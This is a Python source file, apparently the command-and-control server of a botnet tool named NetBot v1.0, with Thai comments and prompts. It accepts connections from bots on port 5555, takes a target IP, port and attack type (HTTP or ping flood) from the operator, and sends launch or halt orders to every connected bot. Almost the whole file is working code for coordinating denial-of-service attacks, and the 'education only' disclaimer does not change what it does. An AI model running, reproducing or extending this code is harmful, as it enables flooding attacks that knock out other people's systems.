#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# ผู้พัฒนา	 : Shankar Narayana Damodaran
# เครื่องมือ	 : NetBot v1.0
# 
# คำอธิบาย	 : นี่คือโค้ดสำหรับเซิร์ฟเวอร์และไคลเอนต์สำหรับศูนย์ควบคุม (Command & Control Center)
#               ใช้เฉพาะเพื่อการศึกษา การวิจัย และการใช้งานภายในเท่านั้น
#

import socket
import threading
from termcolor import colored

print (""" ______             ______             
|  ___ \       _   (____  \       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\____)\___)______/ \___/ \___)1.0 จาก https://github.com/skavngr
                                       """)


def config():
    # รับค่าจากผู้ใช้แทนที่การโหลดจากไฟล์
    ATTACK_TARGET_HOST = input("กรุณากรอก IP ของเครื่องเป้าหมาย (เช่น 192.168.0.105): ")
    ATTACK_TARGET_PORT = input("กรุณากรอกพอร์ตของเครื่องเป้าหมาย (เช่น 3000): ")
    ATTACK_TYPE = input("กรุณากรอกประเภทการโจมตี (เช่น HTTPFLOOD หรือ PINGFLOOD): ")
    ATTACK_BURST_SECONDS = input("กรุณากรอกจำนวนวินาทีระหว่างการโจมตี (เช่น 0): ")
    ATTACK_CODE = input("กรุณากรอกสถานะการโจมตี (เช่น LAUNCH, HALT, HOLD): ")

    # สร้างค่าที่ใช้ในคำสั่งการโจมตี
    ATTACK_STATUS = f"{ATTACK_TARGET_HOST}_{ATTACK_TARGET_PORT}_{ATTACK_CODE}_{ATTACK_TYPE}_{ATTACK_BURST_SECONDS}"
    return ATTACK_STATUS


def threaded(c):
    while True:
        data = c.recv(1024)
        if not data:
            global connected
            connected = connected - 1;
            print('\x1b[0;30;41m' + ' บ็อตหลุดออกจากระบบ! ' + '\x1b[0m','ตัดการเชื่อมต่อจาก CCC :', c.getpeername()[0], ':', c.getpeername()[1], '\x1b[6;30;43m' + ' จำนวนบ็อตที่เชื่อมต่อทั้งหมด:', connected,  '\x1b[0m')
            break
        c.send(config().encode())

def Main():
    host = "0.0.0.0"
    port = 5555
    global connected
    connected = 0

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(50)
    while True:

        c, addr = s.accept()
        connected = connected + 1;
        print('\x1b[0;30;42m' + ' บ็อตออนไลน์แล้ว! ' + '\x1b[0m','เชื่อมต่อกับ CCC :', addr[0], ':', addr[1], '\x1b[6;30;43m' + ' จำนวนบ็อตที่เชื่อมต่อทั้งหมด:', connected,  '\x1b[0m')

        threading.Thread(target=threaded, args=(c,)).start()

if __name__ == '__main__':
    Main()